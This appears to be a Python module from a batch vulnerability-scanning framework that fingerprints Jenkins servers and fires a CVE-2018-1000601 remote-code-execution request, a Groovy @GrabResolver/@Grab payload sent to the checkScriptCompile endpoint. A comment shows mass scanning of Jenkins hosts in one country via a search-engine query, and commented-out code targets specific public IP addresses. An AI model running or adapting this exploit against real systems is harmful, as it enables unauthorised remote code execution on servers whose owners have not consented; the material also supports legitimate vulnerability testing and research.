# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-27 0:49

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# python3 batch.py -m exploit.scripts.Unauth.Jenkins.CVE_2018_1000601 -cs -fs "app=\"Jenkins\" && country=\"CN\""

class Script(BaseScript):
    name = 'Jenkins'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2018-1000601'
        # 来源
        self.bug_refer = ['https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/']
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;']
        # priority
        self.priority = 1
        # 相关信息
        self.info = 'CVE_2018_1000601'
        # favicon
        self.favicon_md5_list = ['23e8c7bd78e8cd826c5a6073b15068b1']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        await asyncio.sleep(2)
                        text = await response.text()
                        if 'jenkins-agent-protocols' in text:
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                        if response.headers.get('x-jenkins', '') and response.headers.get('x-jenkins-session', ''):
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
                favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if favicon_md5 in self.favicon_md5_list:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, timeout=self.req_timeout)
                if text is not None and 'package#vulntest' in text:
                    gLogger.myscan_info('[{} CVE_2018_1000601] {}'.format(self.name, url))
                    return {'name': '{} CVE_2018_1000601'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    # #
    # resp = requests.get('http://116.62.70.6:8080/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
